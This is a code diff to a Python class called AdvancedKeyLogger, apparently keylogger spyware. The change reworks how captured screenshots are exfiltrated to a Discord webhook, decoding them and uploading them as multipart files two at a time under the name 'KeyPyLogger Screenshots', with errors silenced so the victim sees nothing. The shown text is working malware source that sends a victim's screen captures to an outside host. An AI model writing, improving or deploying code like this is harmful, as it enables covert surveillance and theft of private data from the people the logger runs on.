@@ -348,24 +348,33 @@ class AdvancedKeyLogger:
                     timeout=10
                 )
 
-            # Send screenshots separately (they're large)
+            # Send screenshots separately as files (Discord doesn't support base64 in embeds)
             if self.screenshot_buffer:
-                for screenshot in self.screenshot_buffer[:2]:  # Limit to 2 per batch
-                    embed = {
-                        "title": "📸 Screenshot Capture",
-                        "description": f"Captured at {screenshot['timestamp']}",
-                        "color": 3066993,
-                        "image": {
-                            "url": f"data:image/png;base64,{screenshot['image']}"
-                        }
-                    }
-                    payload = {
-                        "username": "KeyPyLogger Screenshots",
-                        "embeds": [embed]
-                    }
+                for idx, screenshot in enumerate(self.screenshot_buffer[:2]):  # Limit to 2 per batch
                     try:
-                        requests.post(self.webhook_url, json=payload, timeout=10)
-                    except:
+                        # Decode base64 image
+                        image_bytes = base64.b64decode(screenshot['image'])
+
+                        # Create multipart form data with file
+                        files = {
+                            'file': (f'screenshot_{screenshot["timestamp"]}.png', image_bytes, 'image/png')
+                        }
+
+                        # Create payload with embed
+                        payload = {
+                            "content": f"📸 Screenshot captured at {screenshot['timestamp']}",
+                            "username": "KeyPyLogger Screenshots"
+                        }
+
+                        # Send as multipart/form-data
+                        requests.post(
+                            self.webhook_url,
+                            data={"payload_json": json.dumps(payload)},
+                            files=files,
+                            timeout=30
+                        )
+                    except Exception as e:
+                        # Log error silently in production
                         pass
                 self.screenshot_buffer = []
 
